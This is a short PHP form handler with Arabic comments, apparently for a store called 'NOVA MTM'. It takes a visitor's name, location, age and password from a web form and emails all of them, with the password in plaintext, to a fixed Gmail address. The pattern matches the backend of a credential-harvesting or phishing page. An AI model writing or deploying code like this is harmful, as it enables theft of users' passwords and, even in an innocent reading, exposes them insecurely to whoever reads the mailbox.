
<?php
// 1. استلام البيانات من الحقول التي صممتها في TST.index.html
$user_name = $_POST['username'];
$user_loc  = $_POST['location'];
$user_age  = $_POST['age'];
$user_pass = $_POST['password'];

// 2. إعدادات الإرسال عبر Gmail SMTP
$to = "php.css.html.php@gmail.com"; 
$subject = "طلب جديد من متجر NOVA MTM";
$headers = "From: NOVA Store <php.css.html.php@gmail.com>\r\n";
$headers .= "Reply-To: php.css.html.php@gmail.com\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

$message = "وصلت بيانات جديدة:\n";
$message .= "الاسم: $user_name\n";
$message .= "الموقع: $user_loc\n";
$message .= "العمر: $user_age\n";
$message .= "كلمة السر المدخلة: $user_pass";

// ملاحظة: لكي يعمل هذا الكود على جهازك، يجب أن يكون برنامج (XAMPP) مفعل فيه خاصية الـ Sendmail
if(mail($to, $subject, $message, $headers)) {
    echo "success";
} else {
    echo "error";
}
?>